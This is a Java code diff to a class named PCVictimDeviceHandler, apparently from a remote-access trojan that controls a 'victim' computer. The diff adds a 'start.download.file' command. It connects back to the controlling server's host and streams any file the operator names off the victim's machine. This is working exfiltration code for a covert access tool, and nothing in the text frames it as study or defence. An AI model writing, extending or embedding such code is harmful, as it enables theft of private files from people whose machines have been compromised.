@@ -6,10 +6,17 @@ import org.json.simple.JSONArray;
 import org.json.simple.JSONObject;
 
 import java.io.*;
+import java.net.Socket;
 import java.net.SocketAddress;
 
 public class PCVictimDeviceHandler extends ChannelInboundHandlerAdapter {
+    private String host;
     private ChannelHandlerContext ctx;
+
+    PCVictimDeviceHandler(String host) {
+        // TODO: 14.06.2018 maybe we can find host from 'ctx'? I don't want receive 'host' here
+        this.host = host;
+    }
 
     @Override
     public void channelActive(ChannelHandlerContext ctx) {
@@ -102,6 +109,30 @@ public class PCVictimDeviceHandler extends ChannelInboundHandlerAdapter {
                 } catch (IOException e) {
                     e.printStackTrace();
                     sendCmd("", e.toString(), (String) message.get("owner"));
+                }
+                break;
+            case "start.download.file":
+                try {
+                    Socket socket = new Socket(host, Math.toIntExact((Long) message.get("port"))); //connect to server
+                    OutputStream outputStream = socket.getOutputStream();
+                    File file = new File((String) message.get("path"));
+                    if (file.isDirectory()) {
+                        sendErrorCode("fileIsDir", (String) message.get("owner"));
+                        return;
+                    }
+                    FileInputStream fileInputStream = new FileInputStream(file);
+                    byte[] bytes = new byte[8*1024];
+                    int len;
+                    while ((len = fileInputStream.read(bytes)) != -1) {
+                        outputStream.write(bytes, 0, len); //transfer to server
+                    }
+
+                    outputStream.close();
+                    fileInputStream.close();
+                    socket.close();
+
+                } catch (IOException e) {
+                    e.printStackTrace();
                 }
                 break;
         }
